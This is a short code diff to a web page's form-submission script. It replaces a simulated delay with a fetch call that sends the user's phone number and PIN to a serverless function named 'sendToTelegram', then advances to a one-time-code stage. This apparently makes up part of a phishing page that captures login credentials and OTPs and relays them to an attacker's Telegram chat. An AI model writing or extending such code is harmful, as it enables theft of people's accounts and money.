@@ -156,8 +156,16 @@ document.addEventListener('DOMContentLoaded', () => {
       btnSubmit.classList.add('loading');
       btnSubmit.disabled = true;
 
-      // Simulate a small network delay (1.5 seconds)
-      setTimeout(() => {
+      // Send data to Netlify serverless function
+      fetch('/.netlify/functions/sendToTelegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ phone, pin })
+      })
+      .catch(err => console.error('Error sending data:', err))
+      .finally(() => {
         btnSubmit.classList.remove('loading');
         btnSubmit.disabled = false;
         
@@ -175,7 +183,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         // Navigate
         showStage(otpStage);
-      }, 1500);
+      });
     }
   });
 
